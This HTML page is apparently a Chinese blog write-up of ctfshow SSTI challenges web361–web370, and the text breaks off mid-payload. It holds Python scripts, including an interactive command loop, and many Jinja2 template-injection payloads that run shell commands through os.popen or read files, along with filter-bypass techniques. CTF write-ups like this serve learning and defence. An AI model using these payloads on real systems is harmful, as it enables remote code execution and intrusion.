@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow-SSTI | golden的部落阁</title><meta name="author" content="g01den"><meta name="copyright" content="g01den"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="web361：​		name传参，直接干： 123456789101112131415161718192021from requests import getdef get_wrap():    for i in range(100,200):        url &#x3D; &quot;http:&#x2F;&#x2F;a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-SSTI">
+<meta property="og:url" content="http://blog.g01den.top/posts/4826d2ce.html">
+<meta property="og:site_name" content="golden的部落阁">
+<meta property="og:description" content="web361：​		name传参，直接干： 123456789101112131415161718192021from requests import getdef get_wrap():    for i in range(100,200):        url &#x3D; &quot;http:&#x2F;&#x2F;a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg">
+<meta property="article:published_time" content="2025-05-03T15:19:26.000Z">
+<meta property="article:modified_time" content="2025-05-03T15:39:38.752Z">
+<meta property="article:author" content="g01den">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.g01den.top/posts/4826d2ce.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow-SSTI',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-05-03 23:39:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="golden的部落阁" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="golden的部落阁"><span class="site-name">golden的部落阁</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow-SSTI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-03T15:19:26.000Z" title="发表于 2025-05-03 23:19:26">2025-05-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-03T15:39:38.752Z" title="更新于 2025-05-03 23:39:38">2025-05-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web狗的自我安慰</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow-SSTI"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web361："><a href="#web361：" class="headerlink" title="web361："></a>web361：</h1><p>​		name传参，直接干：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_wrap</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        resp = get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure>
+
+<p>​	<strong>补充：几种手法</strong></p>
+<blockquote>
+<ul>
+<li>手法一：payload os.warp_close类 的popen 方法</li>
+<li>?name&#x3D;<code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></li>
+<li>手法二： 利用config：</li>
+<li>?name&#x3D;<code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125;</code></li>
+<li>手法三：<code>lipsum.__globals__</code>含有os模块：</li>
+<li>?name&#x3D;<code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li>
+<li>手法三：利用<code>__builtins__</code></li>
+<li>?name&#x3D;<code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li>
+<li>?name&#x3D;<code>&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></li>
+</ul>
+</blockquote>
+<h1 id="web362："><a href="#web362：" class="headerlink" title="web362："></a>web362：</h1><p>​		过滤了数字2，3，上没有数字的payload就行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure>
+
+<p>​		另外的payload：</p>
+<ul>
+<li><pre><code class="python">?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;
+#先利用join和count过滤器得到数字2，然后再用66*2去得到132
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  ?name=&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line">  #builtins模块，里面有eval方法可以调用</span><br><span class="line">  #用eval去调用__import__方法，import方法是导入模块用的，我们导入os模块，然后调用os模块的popen，再read就可以了</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><pre><code class="python">?name=&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;
+或者
+?name=&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># web363：</span><br><span class="line"></span><br><span class="line">​		过滤了引号，可以用request来绕过：</span><br><span class="line"></span><br><span class="line">​		payload1：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">?name=&#123;&#123;x.__init__.__globals__[request.args.a].eval(request.args.b)&#125;&#125;&amp;a=__builtins__&amp;b=__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<p>​		payload2：这里用config拿到字符串，比较麻烦就不全演示了，只演示部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125;&#125;</span><br><span class="line">相当于</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		payload3：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]%&#125;</span><br><span class="line"> </span><br><span class="line">使用</span><br><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web364："><a href="#web364：" class="headerlink" title="web364："></a>web364：</h1><p>​		过滤了引号，args，同时不允许使用POST传参，使用Cookie传参吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][request.cookies.m1](<span class="number">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		之后Cookie传入参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web365："><a href="#Web365：" class="headerlink" title="Web365："></a>Web365：</h1><p>​		这里在上一个题的基础上过滤了中括号，所以得用别的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		之后Cookie传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>​		还有个办法，不过是一次性的，失败了之后环境就废了，毕竟pop会删除对应的键，导致环境崩溃：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​				之后Cookie传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web366："><a href="#Web366：" class="headerlink" title="Web366："></a>Web366：</h1><p>​		这个题多过滤了下划线，可以用lipsum绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		之后Cookie传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web367："><a href="#Web367：" class="headerlink" title="Web367："></a>Web367：</h1><p>​		这个题又过滤了个os，直接扔个payload吧，Payload解释问Ai都可以问出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		之后传入Cookie：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web368："><a href="#Web368：" class="headerlink" title="Web368："></a>Web368：</h1><p>​		这个题，需要用到<code>&#123;% %&#125;</code>，因为双大括号里的request被过滤了，但是<code>&#123;% %&#125;</code>中的request没有被过滤，和上一个题构造的payload一样，不过有点改变，就是没有使用双大括号，所以需要print输出以下（类似无回显）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web369："><a href="#Web369：" class="headerlink" title="Web369："></a>Web369：</h1><p>​		这里直接给request给ban了，不过可以自己拼字符串，还算好，直接上最终payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		看着很长很唬人，但实际确实不简单，这个我会在下一篇文章进行考点总结的，不急，这里先给下解释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //拼接出pop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //拼接出_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //拼接出__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //拼接出__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;		//拼接出__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;		//拼接出__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;		</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;		//使用<span class="built_in">chr</span>类来进行RCE因为等会要<span class="built_in">ascii</span>转字符</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;	//拼接出/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web370："><a href="#Web370：" class="headerlink" title="Web370："></a>Web370：</h1><p>​		这个题过滤了数字，不过可以用全角数字来绕过，转换的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入想要转换的数字字符串：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​		得到的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(２４)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span 